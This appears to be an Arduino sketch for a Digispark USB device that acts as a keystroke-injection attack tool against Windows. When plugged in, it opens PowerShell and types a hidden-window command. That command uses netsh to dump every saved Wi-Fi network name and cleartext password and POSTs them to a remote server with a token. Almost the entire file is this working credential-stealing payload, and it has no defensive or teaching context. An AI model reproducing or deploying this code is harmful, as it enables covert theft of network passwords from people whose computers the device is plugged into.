/*
Copyright (c) 2019 Hassan Shehata
Permission is hereby granted, free of charge, 
to any person obtaining a copy of this software and associated documentation files
(the "Software"), to deal in the Software without restriction, 
including without limitation the rights to use, copy, modify, merge, 
publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so
*/

#include "DigiKeyboard.h" //importing keyboard library
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0); //initialization
  //Windows Payload
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // press windowsKey+R opens Run
  delay(1000);
  DigiKeyboard.print("powershell"); // write powershell 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // opens powershell
  delay(1000);
  DigiKeyboard.print("powershell -windowstyle hidden{$arr=$(netsh wlan show profile)-split': ';$res=@();for($i=10;$i-le$arr.Length-2;$i+=2){$ssid=$arr[$i];$pss=$(netsh wlan show profile name=$ssid key=clear|findstr \"Key Content\")-split': ';$postParams=@{token='1s5d47s98qwASDaw598wD51Dfg47m85C';data=$arr[$i]+\",\"+$pss[1]};Invoke-WebRequest -Uri https://xx.xx.xx.xx/wifi.php -Method POST -Body $postParams}}");// Get SSIDs
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
  
  for (;;) {
    // stops re-execution // just remove the Digispark
  }
}
